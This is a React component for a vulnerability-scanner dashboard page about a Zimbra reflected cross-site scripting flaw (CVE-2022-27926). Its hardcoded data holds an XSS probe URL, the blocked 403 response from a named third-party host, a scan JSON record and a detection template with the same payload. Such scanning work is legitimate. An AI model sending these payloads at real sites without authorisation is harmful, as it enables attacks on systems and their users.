import {
  Button,
  Container,
  Typography,
  Box,
  Chip,
  Grid2 as Grid,
} from "@mui/material";
import Title from "../../ui/Title";
import ShareOutlinedIcon from "@mui/icons-material/ShareOutlined";
import RestartAltIcon from "@mui/icons-material/RestartAlt";
import TrendingUpIcon from "@mui/icons-material/TrendingUp";
import CloseIcon from "@mui/icons-material/Close";
import Tabs from "../result/Tabs";

const Codevalue: Array<string> = [
  `
GET /public/error.jsp?errCode=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E HTTP/1.1
Host: www.lapersonnelle.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 [ip:193.22.90.71]
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
    `,
  `
HTTP/1.1 403 Forbidden
Connection: close
Content-Length: 404
Cache-Control: max-age=0, no-cache, no-store
Content-Type: text/html
Date: Fri, 30 Aug 2024 22:22:58 GMT
Domorigin: www.lapersonnelle.com
Expires: Fri, 30 Aug 2024 22:22:58 GMT
Mime-Version: 1.0
Pragma: no-cache

<HTML><HEAD>
<TITLE>Access Denied</TITLE>
</HEAD><BODY>
<H1>Access Denied</H1>
 
You don't have permission to access "http&#58;&#47;&#47;www&#46;lapersonnelle&#46;com&#47;public&#47;error&#46;jsp&#63;" on this server.<P>
Reference&#32;&#35;18&#46;116bdc17&#46;1725056578&#46;19b805dc
<P>https&#58;&#47;&#47;errors&#46;edgesuite&#46;net&#47;18&#46;116bdc17&#46;1725056578&#46;19b805dc</P>
</BODY>
</HTML>

  `,
  `
  {
  "host": "www.lapersonnelle.com",
  "info": {
    "author": [
      "rootxharsh",
      "iamnoooob",
      "pdresearch"
    ],
    "classification": {
      "cpe": "cpe:2.3:a:zimbra:collaboration:9.0.0:-:*:*:*:*:*:*",
      "cve-id": [
        "cve-2022-27926"
      ],
      "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      "cvss-score": 6.1,
      "cwe-id": [
        "cwe-79"
      ],
      "epss-percentile": 0.98582,
      "epss-score": 0.91246
    },
    "description": "A reflected cross-site scripting (XSS) vulnerability in the /public/launchNewWindow.jsp component of Zimbra Collaboration (aka ZCS) 9.0 allows unauthenticated attackers to execute arbitrary web script or HTML via request parameters.\n",
    "metadata": {
      "max-request": 1,
      "product": "collaboration",
      "vendor": "zimbra",
      "verified": true
    },
    "name": "Zimbra Collaboration (ZCS) - Cross Site Scripting",
    "reference": [
      "https://nvd.nist.gov/vuln/detail/CVE-2022-27926",
      "https://wiki.zimbra.com/wiki/Security_Center",
      "https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P24",
      "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories"
    ],
    "remediation": "Apply the latest security patches or updates provided by Zimbra to fix the XSS vulnerability.\n",
    "severity": "medium",
    "tags": [
      "cve",
      "cve2022",
      "zimbra",
      "xss",
      "kev"
    ]
  },
  "ip": "23.212.251.17",
  "matcher-status": false,
  "request": "GET /public/error.jsp?errCode=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E HTTP/1.1\r\nHost: www.lapersonnelle.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 [ip:193.22.90.71]\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
  "response": "HTTP/1.1 403 Forbidden\r\nConnection: close\r\nContent-Length: 404\r\nCache-Control: max-age=0, no-cache, no-store\r\nContent-Type: text/html\r\nDate: Fri, 30 Aug 2024 22:22:58 GMT\r\nDomorigin: www.lapersonnelle.com\r\nExpires: Fri, 30 Aug 2024 22:22:58 GMT\r\nMime-Version: 1.0\r\nPragma: no-cache\r\n\r\n<HTML><HEAD>\n<TITLE>Access Denied</TITLE>\n</HEAD><BODY>\n<H1>Access Denied</H1>\n \nYou don't have permission to access \"http&#58;&#47;&#47;www&#46;lapersonnelle&#46;com&#47;public&#47;error&#46;jsp&#63;\" on this server.<P>\nReference&#32;&#35;18&#46;116bdc17&#46;1725056578&#46;19b805dc\n<P>https&#58;&#47;&#47;errors&#46;edgesuite&#46;net&#47;18&#46;116bdc17&#46;1725056578&#46;19b805dc</P>\n</BODY>\n</HTML>\n",
  "template-id": "CVE-2022-27926",
  "timestamp": "2024-08-30T22:22:58.443465358Z",
  "type": "http"
}
  `,
  `
  id: CVE-2022-27926

info:
  name: Zimbra Collaboration (ZCS) - Cross Site Scripting
  author: rootxharsh,iamnoooob,pdresearch
  severity: medium
  description: |
    A reflected cross-site scripting (XSS) vulnerability in the /public/launchNewWindow.jsp component of Zimbra Collaboration (aka ZCS) 9.0 allows unauthenticated attackers to execute arbitrary web script or HTML via request parameters.
  remediation: |
    Apply the latest security patches or updates provided by Zimbra to fix the XSS vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-27926
    - https://wiki.zimbra.com/wiki/Security_Center
    - https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P24
    - https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-27926
    cwe-id: CWE-79
    epss-score: 0.91246
    epss-percentile: 0.98582
    cpe: cpe:2.3:a:zimbra:collaboration:9.0.0:-:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: zimbra
    product: collaboration
  tags: cve,cve2022,zimbra,xss,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/public/error.jsp?errCode=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<img src=x onerror=alert(document.domain)>Title???'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
  `,
];

export default function Vulns() {
  return (
    <Container maxWidth="xl">
      <Title
        title="Zimbra Collaboration (ZCS) - Cross Site Scripting"
        description="CVE-2022-27926"
        style={{ display: "flex", alignItems: "center" }}
        margin={4}
      >
        <Typography variant="body2" color="#9999A1" sx={{ mr: 5 }}>
          Last scanned 16d ago
        </Typography>
        <Button
          variant="outlined"
          size="small"
          startIcon={<RestartAltIcon sx={{ color: "#8C8C94" }} />}
          color="inherit"
          sx={{
            borderColor: "#27272A",
            py: 0.5,
            px: 1,
            textTransform: "none",
            color: "#FAFAFA",
            "&:hover": {
              bgcolor: "#27272A",
            },
          }}
        >
          Rescan
        </Button>
        <Button
          variant="outlined"
          size="small"
          color="inherit"
          sx={{
            borderColor: "#27272A",
            px: 0,
            minWidth: "45px",
            py: 0.7,
            ml: 1,
            "&:hover": {
              bgcolor: "#27272A",
            },
          }}
        >
          <ShareOutlinedIcon fontSize="small" sx={{ color: "#8C8C94" }} />
        </Button>
      </Title>
      <Box mt={2}>
        <Chip
          label="MEDIUM"
          size="small"
          variant="outlined"
          sx={{
            bgcolor: "#38270B",
            color: "#C6961D",
            borderColor: "#4C3812",
            borderRadius: "5px",
            px: 0.5,
            py: 1.7,
          }}
        />
        <Chip
          label="Actively Exploited"
          size="small"
          variant="outlined"
          icon={<TrendingUpIcon style={{ color: "#C95F60" }} />}
          sx={{
            bgcolor: "#18181B",
            color: "#92929A",
            borderColor: "#27272A",
            borderRadius: "5px",
            px: 0.5,
            py: 1.7,
            ml: 2,
          }}
        />
        <Chip
          label="Not Matched"
          size="medium"
          variant="outlined"
          icon={<CloseIcon style={{ color: "#71717A" }} />}
          sx={{
            bgcolor: "#18181B",
            color: "#92929A",
            borderColor: "#27272A",
            borderRadius: "5px",
            px: 1,
            py: 2.1,
            ml: 2,
          }}
        />
      </Box>
      <Box mt={5}>
        <Grid container spacing={5}>
          <Grid size={8}>
            <Box sx={{mt:2}}>
              <Typography variant="body2" color="#A6A6A6">
                A reflected cross-site scripting (XSS) vulnerability in the
                /public/launchNewWindow.jsp component of Zimbra Collaboration
                (aka ZCS) 9.0 allows unauthenticated attackers to execute
                arbitrary web script or HTML via request parameters.
              </Typography>
            </Box>
            <Box mt={4}>
              <Typography variant="body2" color="initial">
                Remediation
              </Typography>
              <Typography variant="body2" color="#A6A6A6" sx={{ mt: 2 }}>
                Apply the latest security patches or updates provided by Zimbra
                to fix the XSS vulnerability.
              </Typography>
            </Box>
            <Box mt={4}>
              <Typography variant="body2" color="initial">
                Reproduction
              </Typography>
            </Box>
            <Box my={2}>
              <Tabs
                code={Codevalue}
                tabTitle={["Request", "Response", "JSON", "Template"]}
                style={{ border: "1px solid #27272A", borderRadius: "10px" }}
                height="200px"
              />
            </Box>
          </Grid>
          <Grid size={4}>
            <Box
              border={1}
              borderColor={"#27272A"}
              bgcolor={"#151518"}
              borderRadius={2}
              height={'450px'}
              overflow={'auto'}
            >
              <Box display={"flex"} alignItems={"center"} pl={5} pt={4} pb={2}>
                <Typography variant="body2" color="#9797A0">
                  Timestamp
                </Typography>
                <Typography
                  variant="body1"
                  color="initial"
                  sx={{ fontSize: ".9rem", pl: 13 }}
                >
                  31 Aug 2024 | 01:52
                </Typography>
              </Box>
              <Box component={"hr"} sx={{ border: "1px solid #27272A" }} />
              <Box display={"flex"} alignItems={"center"} pl={5} pb={2} pt={3}>
                <Box>
                  <Typography variant="body2" color="#9797A0">
                    Host
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    Template
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    IP Address
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    Vuln ID
                  </Typography>
                </Box>
                <Box pl={13}>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem" }}
                  >
                    www.lapersonnelle.com
                  </Typography>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    CVE-2022-27926
                  </Typography>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    23.212.251.17
                  </Typography>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    cr94cgirc0tc738rc8lg
                  </Typography>
                </Box>
              </Box>
              <Box component={"hr"} sx={{ border: "1px solid #27272A" }} />
              <Box display={"flex"} alignItems={"center"} pl={5} pb={2} pt={3}>
                <Box>
                  <Typography variant="body2" color="#9797A0">
                    Protocol
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    Vendor
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    Product
                  </Typography>
                </Box>
                <Box pl={15}>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem" }}
                  >
                    http
                  </Typography>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    zimbra
                  </Typography>
                  <Typography
                    variant="body1"
                    color="initial"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    collaboration
                  </Typography>
                </Box>
              </Box>
              <Box component={"hr"} sx={{ border: "1px solid #27272A" }} />
              <Box display={"flex"} alignItems={"center"} pl={5} pb={2} pt={3}>
                <Box>
                  <Typography variant="body2" color="#9797A0">
                    EPSS
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    CVSS Score
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    CVSS Metrics
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    CVE
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    CWE
                  </Typography>
                  <Typography variant="body2" color="#9797A0" sx={{ mt: 2 }}>
                    CPE
                  </Typography>
                </Box>
                <Box pl={11}>
                  <Typography
                    variant="body1"
                    color="#CD860D"
                    sx={{ fontSize: ".9rem" }}
                  >
                    0.91246
                  </Typography>
                  <Typography
                    variant="body1"
                    color="#CD860D"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    6.1
                  </Typography>
                  <Typography
                    variant="body1"
                    color="#93939B"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    CVSS:3.1/AV:N/AC:L/PR:N <br /> /UI:R/S:C/C:L/I:L/A:N
                  </Typography>
                  <Typography
                    variant="body1"
                    color="#93939B"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    CVE-2022-27926
                  </Typography>
                  <Typography
                    variant="body1"
                    color="#93939B"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    CWE-79
                  </Typography>
                  <Typography
                    variant="body1"
                    color="#93939B"
                    sx={{ fontSize: ".9rem", mt: 2 }}
                  >
                    cpe:2.3:a:zimbra:collabor <br /> ation:9.0.0:-:*:*:*:*:*:*
                  </Typography>
                </Box>
              </Box>
            </Box>
          </Grid>
        </Grid>
      </Box>
    </Container>
  );
}
